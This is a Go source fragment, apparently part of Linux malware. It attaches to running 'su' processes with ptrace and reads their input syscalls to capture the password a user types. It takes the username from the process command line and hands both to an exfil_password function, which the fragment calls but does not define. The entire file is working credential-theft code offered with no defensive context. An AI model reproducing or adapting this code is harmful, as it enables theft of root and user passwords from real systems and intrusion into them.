package main

import (
	"fmt"
	"io/ioutil"
	"strings"
	"syscall"
	"unicode"
)

func traceSUProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()
	var wstatus syscall.WaitStatus
	var readSyscallCount int
	for {

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		var regs syscall.PtraceRegs
		ptrace_err := syscall.PtraceGetRegs(pid, &regs)
		if ptrace_err != nil {
			syscall.PtraceDetach(pid)
			return
		}
		if regs.Orig_rax == 0 && regs.Rdi == 0 {
			readSyscallCount++
			if readSyscallCount == 3 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					return
				}
				if strings.Contains(string(buffer), "\n") {
					cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					if err != nil {
						return
					}
					username := "root"
					if len(cmdline) > 3 {
						username = string((cmdline[3:]))
					}
					password := strings.Split(string(buffer), "\n")[0]
					if func(s string) bool {
						for _, r := range s {
							if !unicode.IsPrint(r) {
								return false
							}
						}
						return true
					}(password) {
						go exfil_password(username, password)
					}
				}
			}
		}
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
